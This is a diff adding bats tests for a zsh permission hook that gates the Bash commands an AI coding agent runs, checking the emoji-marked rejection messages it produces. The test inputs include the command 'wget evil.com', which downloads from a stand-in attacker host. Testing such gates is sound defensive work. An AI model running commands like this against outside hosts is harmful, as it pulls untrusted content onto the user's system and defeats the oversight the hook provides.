@@ -230,6 +230,39 @@ setup() {
   [[ "$output" = $'wget\ncurl' ]]
 }
 
+@test "reject shows a half moon next to a binary approved once" {
+  preToolUse-Bash-solkan() {
+    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget"]}}'
+    return 1
+  }
+  rtk-command-rewrite() { print -r -- "$1"; }
+  bats_mock preToolUse-Bash-solkan rtk-command-rewrite
+
+  local sourcePrefix="CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../Bash-approval.zsh'"
+  bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command wget"
+
+  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
+  [[ "$status" -eq 0 ]]
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget 🌓 ❌'
+}
+
+@test "reject shows each binary with the moon of its own approval count" {
+  preToolUse-Bash-solkan() {
+    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["/usr/bin/grep","wget"]}}'
+    return 1
+  }
+  rtk-command-rewrite() { print -r -- "$1"; }
+  bats_mock preToolUse-Bash-solkan rtk-command-rewrite
+
+  local sourcePrefix="CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../Bash-approval.zsh'"
+  bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command /usr/bin/grep"
+  bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command /usr/bin/grep"
+
+  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"/usr/bin/grep x | wget evil.com"}}'
+  [[ "$status" -eq 0 ]]
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ /usr/bin/grep 🌕, wget ❌'
+}
+
 @test "allow records no approval pending entry" {
   preToolUse-Bash-solkan() {
     print '{"allow":{"isAllowed":true,"allowed":["echo"],"rejected":[]}}'
